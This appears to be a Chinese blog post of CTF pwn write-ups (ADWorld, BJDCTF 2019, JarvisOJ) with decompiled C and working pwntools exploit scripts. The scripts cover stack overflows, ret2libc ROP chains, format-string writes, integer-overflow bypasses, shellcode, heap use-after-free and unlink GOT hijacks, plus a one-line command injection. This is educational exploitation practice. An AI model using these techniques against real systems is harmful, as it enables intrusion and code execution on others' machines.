---
title: 近期简单 Pwn 合集
date: 2020-02-03
tags:
  - 整数溢出
  - 栈漏洞
  - fsb
  - 堆漏洞
  - RSA
categories:
  - 系统安全
---

近期做的一些简单 Pwn 题记录。题目来自 ADWorld 新手区、BJDCTF 2019、JarvisOJ。

<!--more-->

## ADWorld 新手区

### level2

基本的栈溢出到 `system` 地址随后传入 `/bin/sh` 地址，后者可通过 ROPgadget 搜索到。

```python
ru('Input:\n')
binsh = 0x804a024
payload = flat('a'*(0x88+4),elf.plt['system'],'a'*4, binsh)
sl(payload)
```

### guess_num

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+4h] [rbp-3Ch]
  int i; // [rsp+8h] [rbp-38h]
  int v6; // [rsp+Ch] [rbp-34h]
  char v7; // [rsp+10h] [rbp-30h]
  unsigned int seed[2]; // [rsp+30h] [rbp-10h]
  unsigned __int64 v9; // [rsp+38h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  v4 = 0;
  v6 = 0;
  *(_QWORD *)seed = sub_BB0();
  puts("-------------------------------");
  puts("Welcome to a guess number game!");
  puts("-------------------------------");
  puts("Please let me know your name!");
  printf("Your name:", 0LL);
  gets(&v7);
  srand(seed[0]);
  for (i = 0; i <= 9; ++i)
  {
    v6 = rand() % 6 + 1;
    printf("-------------Turn:%d-------------\n", (unsigned int)(i + 1));
    printf("Please input your guess number:");
    __isoc99_scanf("%d", &v4);
    puts("---------------------------------");
    if (v4 != v6)
    {
      puts("GG!");
      exit(1);
    }
    puts("Success!");
  }
  sub_C3E();
  return 0LL;
}
```

使用了 `srand` 生成随机种子，但是参数 `seed` 可以被 `v7` 覆盖，因此我们只需要控制 `seed[0]` 即可预测产生的随机数从而进入 `sub_C3E` 后门函数。

```python
ru('name:')
payload = flat('a'*0x20, 0)
sl(payload)

from ctypes import *
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(0)
for i in range(10):
    sla('number:', libc.rand()%6+1)
```

### int_overflow

本题只能 `login`，并输入用户名密码，随后进入 `check_passwd` 函数验证：

```c
char *__cdecl check_passwd(char *s)
{
  char *result; // eax
  char dest; // [esp+4h] [ebp-14h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if (v3 <= 3u || v3> 8u )
  {
    puts("Invalid Password");
    result = (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    result = strcpy(&dest, s);
  }
  return result;
}
```

注意到这里我们希望进入 `else` 语句，将输入的 `s` 复制到 `dest` 所在地址处造成栈溢出。但是这要求 `s` 的长度大于 3 且小于 8，这个长度太短了。因此结合题名考虑整数溢出：这里的 `v3` 是无符号的 8 位整数，那么当字符串长度实际上只需要模 255 的结果大于 3 小于 8 即可。最后返回到后门函数。

```python
ru('choice:')
sl('1')
ru('username:\n')
sl('aaa')
ru('passwd:\n')
payload = flat('a'*(0x14+4),elf.sym['what_is_this'])
sl(payload.ljust(260,'a'))
```

### cgpwn2

本题提供了一个 bss 段的可写的 `name` 字符串数组，显然就是要我们向其中写入 `/bin/sh`，然后通过溢出调用 `system("/bin/sh")`。

```python
ru('name\n')
sl('/bin/sh')
ru('here:\n')
payload = flat('a'*(0x26+4),elf.plt['system'],'a'*4,0x804a080)
sl(payload)
```

### when_did_you_born

这题要求输入的生日年份 `v5` 不能等于 1926，但是之后又要求 `v5` 等于 1926，两者之间存在一个 `get(&v4)` 的操作，很容易想到通过溢出 `v4` 来修改 `v5` 的值。

```python
ru('Birth?\n')
sl('1900')
ru('Name?\n')
payload = flat('a'*0x8,1926)
sl(payload)
```

### hello_pwn

直接计算得到偏移量为 4 并溢出为指定值即可，没有难度。

```python
ru('bof\n')
payload = flat('a'*4,0x6e756161)
sl(payload)
```

### level3

基础的 ret2libc，注意加载题目给定的 libc。

```python
ru('Input:\n')
payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['write'],0x4)
sl(payload)
write = uu32(r(4))
leak('write',write)

base = write - libc.sym['write']
system = base + libc.sym['system']
binsh = base + libc.search('/bin/sh').next()

ru('Input:\n')
payload = flat('a'*(0x88+4),system,'a'*4,binsh)
sl(payload)
```

### string

跟着剧情走一遍大概可以知道可以选的选项以及格式化字符串漏洞的存在。查看代码可以验证漏洞，关键是如何利用。

我们在角色死亡的函数发现了一个分支：

```c
unsigned __int64 __fastcall sub_400CA6(_DWORD *a1)
{
  void *v1; // rsi
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!");
  puts("Dragon say: HaHa! you were supposed to have a normal");
  puts("RPG game, but I have changed it! you have no weapon and");
  puts("skill! you could not defeat me !");
  puts("That's sound terrible! you meet final boss!but you level is ONE!");
  if (*a1 == a1[1] )
  {
    puts("Wizard: I will help you! USE YOU SPELL");
    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    read(0, v1, 0x100uLL);
    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

这里显然是需要用到巫师的法术，也就是说和开头的 secret 有关。当 `*a1 == a1[1]` 时会触发并从用户输入读取 `v1`，随后直接当作代码执行，那么这里应该是需要 shellcode。而 `a1` 来自于 `main` 函数中的 `v4`：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  _DWORD *v3; // rax
  __int64 v4; // ST18_8

  setbuf(stdout, 0LL);
  alarm(0x3Cu);
  sub_400996(60LL, 0LL);
  v3 = malloc(8uLL);
  v4 = (__int64)v3;
  *v3 = 68;
  v3[1] = 85;
  puts("we are wizard, we will give you hand, you can not defeat dragon by yourself ...");
  puts("we will tell you two secret ...");
  printf("secret[0] is %x\n", v4, a2);
  printf("secret[1] is %x\n", v4 + 4);
  puts("do not tell anyone");
  sub_400D72(v4);
  puts("The End.....Really?");
  return 0LL;
}
```

而 `v4` 实际上就是 `v3`，那么这里将 `v3[0]` 改为 `85` 即可。而巫师给我们的 `secret[0]` 恰好就是我们需要的 `v3[0]` 的地址，我们把这个地址输入到 `Give me an address` 后，然后在 `wish` 处输入格式化字符串。首先由于需要 `%n` 写入，我们先输出 85 个字符即 `%85c`，随后要测出偏移，可以通过 `aaaa%p.%p.` 这种形式的格式化字符串测出偏移为 7。因此最终构造的格式化字符串为 `%85c%7$n`。

```python
ru('secret[0] is ')
addr = int(ru('\n'), 16)
sla('name be:\n', 'merc')
sla('up?:\n', 'east')
sla('(0)?:\n','1')
sla("address'\n", str(addr))
sla('is:\n', '%85c%7$n')
ru('SPELL\n')
sl(asm(shellcraft.sh()))
```

### getshell

nc 直连。

### CGfsb

同样是格式化字符串漏洞，相比 `string` 那题要简单不少，只需要让全局变量 `pwnme` 为 8，地址可直接 IDA 得到，偏移量同样通过 `aaaa%p.%p.` 测出。为此构造字符串 `pwnme 地址 ` + `%4c%10$n`，`%4c` 是为了让已打印字符凑足 8 个。

```python
pwnme = 0x804a068
sla('name:\n', 'merc')
sla('please:\n', p32(pwnme) + '%4c%10$n')
```

## BJDCTF2019

### babyrouter

读入 ip 地址并没有过滤就作为 `system` 的参数。因此直接构造 `1; cat flag` 即可。

### babystack

ret2text 模板题。

```python
sla('name:\n','1000')
payload = flat('a'*0x18,elf.sym['backdoor'])
sla('name?\n', payload)
```

### babyrop

ret2libc 模板题。

```python
pop_rdi = 0x400733
payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['vuln'])
ru('story!\n')
sl(payload)
read = uu64(r(6))
leak('read',read)
system,binsh = ret2libc(read,'read')
payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8)
sla('story!\n',payload)
```

### babystack2

本题在 babystack 的基础上，限制了输入的长度：

```c
if ((signed int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
```

注意到这里仅仅判断了大于，而且会强制类型转换为有符号数，而原来的 `nbytes` 是无符号的，因此可以整数溢出绕过。

```python
sla('name:\n','-1')
payload = flat('a'*0x18,elf.sym['backdoor'])
sla('name?\n', payload)
```

### babyrop2

本题在 babyrop 的基础上增加了 canary，那么泄露 canary 即可。要做到这一点，无疑需要新增函数 `gift` 的帮助。在该函数中明显存在一个格式化字符串漏洞。

通过反复 `%2$p`，`%3$p` 可知 canary 在第 7 个，这可以通过其长度 8 字节以及末尾的 `00` 字节判断。然后从汇编中可知 canary 位于 `ebp-0x10` 处，填入适当位置即可。

```python
sla('u!\n','%7$p')
ru('0x')
canary = int(r(16),16)
leak('canary', canary)
pop_rdi = 0x400993
payload = flat('a'*0x18,canary,'a'*8,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['vuln'])
ru('story!\n')
sl(payload)
read = uu64(r(6))
leak('read',read)
system,binsh = ret2libc(read,'read')
payload = flat('a'*0x18,canary,'a'*8,pop_rdi,binsh,system,'a'*8)
sla('story!\n',payload)
```

### encrypted_stack

逆向题，`sub_400a70` 处存在求逆元函数，说明题目可能使用了 RSA 加密，我们的任务就是找到私钥然后对题目产生的随机数进行解密，循环 20 次后即可通过验证，最后 ret2libc。在 `main` 中可以发现如下语句：

```c
v7 = qword_602098;
v8 = qword_602090;
```

猜测是 RSA 的 e 和 N，查看后发现 `e=0x10001, N=0x150013E8C603B57`。这个 N 显然容易分解，从而得到私钥。

```python
N = 94576960329497431
d = 26375682325297625

def powmod(a, b, m):
    if a == 0:
        return 0
    if b == 0:
        return 1
    res = powmod(a,b//2,m)
    res *= res
    res %= m
    if b&1:
        res *= a
        res %= m
    return res

def ans():
    global ru,sl
    ru("it\n")
    for i in range(20):
        c = int(ru('\n'))
        m = powmod(c, d, N)
        sl(str(m))
        ru('\n')

ans()
ru('name:\n')
pop_rdi = 0x40095a
welcome = 0x400b30
payload = flat('a'*0x48,pop_rdi,elf.got['read'],elf.plt['puts'],welcome)
sl(payload)
read = uu64(r(6))
leak('read',read)
system,binsh = ret2libc(read,'read')
payload = flat('a'*0x48,pop_rdi,binsh,system)
sl(payload)
```

### YDSneedGirlfriend

本题在删除时没有将指针置空，存在 uaf。而 `girlfriend` 结构体由一个打印名字的函数和存储名字的 `char` 数组构成，我们希望能将该函数指向程序中已经存在的 `backdoor` 函数。需要注意 64 位下最少分配 `0x20` 字节，而 `add(0x20)` 会分配 `0x30` 字节。这确保了在 `add(0x8)` 时，先被分配到的是 `girlfriend1` 的函数指针，然后是 `girlfriend0` 的函数指针。

```python
def add(size,name='a'):
    sla(':','1')
    sla(':',str(size))
    sla(':',name)

def delete(index):
    sla(':','2')
    sla(':',str(index))

def show(index):
    sla(':','3')
    sla(':',str(index))

add(0x20)
add(0x20)
delete(0)
delete(1)
add(0x8,p64(elf.sym['backdoor']))
show(0)
```

本题和 hitcontraining_uaf 类似，不过后者是 32 位的。

```python
def add(size,name='a'):
    sla(':','1')
    sla(':',str(size))
    sla(':',name)

def delete(index):
    sla(':','2')
    sla(':',str(index))

def show(index):
    sla(':','3')
    sla(':',str(index))

add(0x10)
add(0x10)
delete(0)
delete(1)
add(0x8,p32(elf.sym['magic']))
show(0)
```

## JarvisOJ

### level0

ret2text。

```python
payload = flat('a'*0x88,elf.sym['callsystem'])
sla('World\n', payload)
```

### level1

题目给出了 `buf` 的真实地址，且 `buf` 可以输入 `0x100` 字节，那么可以在 `buf` 中写 shellcode 然后返回到 `buf`。

```python
ru('0x')
buf = int(ru('?'),16)
leak('buf', buf)
payload = asm(shellcraft.sh()).ljust(0x88+4,'a') + p32(buf)
sl(payload)
```

但是本题远程文件出了点问题导致拿不到 `buf` 的真实地址，所以换了种办法，调用 `read` 把 shellcode 读取到 bss 段上，然后返回到 bss 段 getshell。

```python
pop3 = 0x8048549
payload = flat('a'*(0x88+4),elf.plt['read'],pop3,0,elf.bss(),0x100,elf.bss())
sl(payload)
sl(asm(shellcraft.sh()))
```

### level2

本题中存在 `system` 函数，通过 ROPgadgets 搜索到了 `binsh` 字符串，构造调用 `system("/bin/sh")` 即可。

```python
binsh = 0x804a024
payload = flat('a'*(0x88+4),elf.plt['system'],'a'*4,binsh)
sla('Input:\n',payload)
```

### level2_x64

上一题的 64 位版本，需要通过 `pop rdi; ret` 的 gadget 传参。

```python
pop_rdi = 0x4006b3
binsh = 0x600a90
payload = flat('a'*(0x80+8),pop_rdi,binsh,elf.plt['system'])
sla('Input:\n',payload)
```

### level3

没有 system 和 binsh 但有 libc，因此常规 ret2libc。

```python
payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['read'],4)
ru('Input:\n')
sl(payload)
read =uu64(r(4))
leak('read',read)
system,binsh = ret2libc(read,'read')
payload = flat('a'*(0x88+4),system,'a'*4,binsh)
sla('Input:\n',payload)
```

### level3_x64 & level5

上题的 64 位版本，依然需要寄存器传参。

```python
pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
payload = flat('a'*(0x80+8),pop_rdi,1,pop_rsi_r15,elf.got['read'],6,elf.plt['write'],elf.sym['main'])
ru('Input:\n')
sl(payload)
read =uu64(r(6))
leak('read',read)
system,binsh = ret2libc(read,'read')
payload = flat('a'*(0x80+8),pop_rdi,binsh,system)
sla('Input:\n',payload)
```

### level4

和 `level3` 几乎相同，依然是 ret2libc。

```python
payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['read'],4)
sl(payload)
read =uu64(r(4))
leak('read',read)
system,binsh = ret2libc(read,'read')
payload = flat('a'*(0x88+4),system,'a'*4,binsh)
sl(payload)
```

### level6 & level6_x64 & guestbook2

三题比较类似，以 64 位为例。[参考文章](https://www.anquanke.com/post/id/162882)。

首先本题存在一个索引表，结构大致是这样：

```
| ...        |
 ------------
| max_size   |
 ------------
| exist_num  |
 ------------
| allocated0 |
 ------------
| size_user0 |
 ------------
| ptr_heap0  |
 ------------
| allocated1 |
 ------------
| size_user1 |
 ------------
| ptr_heap1  |
 ------------
| ...        |
```

- `max_size`：最大记录数
- `exist_num`：当前记录数
- `chunk0`:
  - `allocated`：是否是被分配的
  - `size_user`：用户数据长度
  - `ptr_heap`：返回给用户的指针

题目主要漏洞有 2 处，首先是新建记录时存在 off-by-one，可以多读入一个字节，从而泄露后面相邻区域的内容。第二处漏洞就是常见的 `free` 后没有置空指针，造成了 `double free`。

首先泄露 libc 地址和堆地址。创建 4 个小 chunk，删掉不相邻的 2 个（防止合并）。由于题目限制最小分配 0x80B，必定会先进入 unsorted bin；然后拿回来并写满 `fd` 的位置，从而打印出 `bk`。`chunk0` 的 `bk` 指向 `chunk2`，相隔一个索引表（0x1820B）和两个正常 chunk(2\*0x90B)，因此可以算出堆地址。`chunk2` 的 `bk` 指向 `main_arena+88`，从而泄露 libc。

随后伪造堆块，`heap+0x30` 是 `chunk0` 的 `ptr_heap` 的位置，`-0x18` 和 `-0x10` 分别指向其 `fd` 和 `bk`。随后继续伪造 `chunk1` 方便后续触发 `unlink(chunk0)`，再伪造 `chunk2` 防止与 top chunk 合并。删除 `chunk1`，即可导致 `unlink(chunk0)`。

最后按索引表结构，进行 GOT 表劫持，把 `free` 劫持到 `system` 并 getshell。

```python
def list():
    sla(':','1')

def add(len,content='a'):
    sla(':','2')
    sla('note:',str(len))
    sa('note:',content)

def edit(index,len,content):
    sla(':','3')
    sla('number:',str(index))
    sla('note:',str(len))
    sa('note:',content)

def delete(index):
    sla(':','4')
    sla('number:',str(index))

for i in range(4):
    add(1)
delete(0)
delete(2)
add(8,'deadbeef') # 0
add(8,'deadbeef') # 2
list()
ru('0. deadbeef') # 0->bk = heap+0x1820+2*0x90
heap = uu64(ru('\n'))-0x1940
leak('heap',heap)

ru('2. deadbeef') # 2->bk = main_arena+88
base = uu64(ru('\n'))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
for i in range(3,-1,-1):
    delete(i)

# chunk0:prev_size,size,fd,bk,data
fake = flat(0,0x81,heap+0x30-0x18,heap+0x30-0x10,'a'*0x60)
# chunk1:prev_size,size,data; chunk2:prev_size,size,data
fake += flat(0x80,0x90,'a'*0x80,0,0x91,'a'*0x80)
add(len(fake),fake)
delete(1) # unlink chunk0

system = base + libc.sym['system']
# len(payload) == len(fake)
payload = flat(1,1,8,elf.got['free'],1,8,heap+0xabcd).ljust(len(fake),'a')
edit(0,len(fake),payload)
edit(0,8,p64(system))
edit(1,8,'/bin/sh\x00')
delete(1)
```

而 `guestbook2` 仅仅是提示语不同，其余没有任何区别。`level6` 是 32 位的版本。

### tell_me_something

64 位下的 ret2text，后门函数为 `good_game` 函数。

```python
payload = flat('a'*0x88,elf.sym['good_game'])
sla(':\n',payload)
```

### fm

存在格式化字符串漏洞，我们需要修改 `x` 的值为 4 来 getshell。测得输入偏移为 11。而 `p32(x 的地址)` 长度 4 字节，恰好能将 4 写入 `x` 的地址。

```python
x = 0x804a02c
sl(p32(x)+'%11$n')
```

### test_your_memory

本题看似复杂，实际上由于给了一个提示 `hint`，指向 `cat flag` 字符串，又存在后门函数 `win_func` 执行 `system(command)`，那么我们只需要把 `cat flag` 字符串传给 `win_func` 即可。

```python
cat_flag = 0x80487e0
payload = flat('a'*(0x13+4),elf.sym['win_func'],elf.sym['main'],cat_flag)
sl(payload)
```

### itemboard

结构体：

```c
struct ItemStruct
{
    char *name;
    char *description;
    void (*free)(ItemStruct *);
}
```

在创建新 item 时，首先会创建 `0x20` 的 `Item Struct*`，包含了 `name,description,free` 三个指针；随后创建 `0x30` 的空间存放 `name`；最后根据用户输入创建对应大小的空间存放 `description`。

那么我们可以先创建一个 `0x80` 的 chunk 然后释放，它会进入 unsorted bin 中，此时其 `fd` 指向 `main_arena+88`，通过 `show` 即可泄露 libc。注意这里的 `show` 函数：

```c
void __cdecl show_item()
{
  Item *item; // ST00_8
  Item *v1; // ST00_8
  int index; // [rsp+Ch] [rbp-4h]

  puts("Which item?");
  fflush(stdout);
  index = read_num();
  if (index < items_cnt && item_array[index] )
  {
    item = item_array[(unsigned __int8)index];
    puts("Item Detail:");
    printf("Name:%s\n", item->name, item);
    printf("Description:%s\n", v1->description);
    fflush(stdout);
  }
  else
  {
    puts("Hacker!");
  }
}
```

它会检查下标是否越界，以及下标对应的元素是否存在。然而，在删除时：

```c
void __cdecl remove_item()
{
  int index; // [rsp+Ch] [rbp-4h]

  puts("Which item?");
  fflush(stdout);
  index = read_num();
  if (index < items_cnt && item_array[index] )
  {
    ((void (__fastcall *)(Item *))item_array[index]->free)(item_array[index]);
    set_null(item_array[index]);
    puts("The item has been removed");
    fflush(stdout);
  }
  else
  {
    puts("Hacker!");
  }
}
```

调用了结构体自己的 `free` 函数，参数是结构体偏移为 0 的位置也就是 `name`。随后的 `set_null` 函数并不会把 `item_array[index]` 置空，因此即使删除了元素，`item_array[index]` 仍然存在，第二项检查毫无作用。这就是为什么我们可以 `show` 一个空闲块从而泄露 libc。

然后我们就有了 `system` 地址，容易想到用它覆盖结构体指针的 `free`，然后让结构体指针的 `name` 指向 `/bin/sh`。不过，如果这里直接 `add` 新的 chunk，首先会分配我们不可控的 `0x20` 的结构体指针，然后才是可控的 `0x30` 的 `name`。因此我们希望 `name` 字段被分配到的实际上是原来 `chunk0` 的结构体指针，这样就可以写入结构体指针了。要做到这一点，可以先 `free(chunk1)` 产生一个大小合适的 chunk。那么再 `add` 时，结构体指针就会使用原来 `chunk1` 的了。

```python
def add(name,len,content):
    sla(':\n','1')
    sla('?\n',name)
    sla('?\n',str(len))
    sla('?\n',content)

def free(index):
    sla(':\n','4')
    sla('?\n',str(index))

def show(index):
    sla(':\n','3')
    sla('?\n',str(index))

add('chunk0',0x80,'a')
add('chunk1',0x80,'b')
free(0)
show(0)
ru('tion:')
base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
system = base + libc.sym['system']

free(1)
add('/bin/sh;'+'a'*8+p64(system),0x18,'c')
free(0)
```
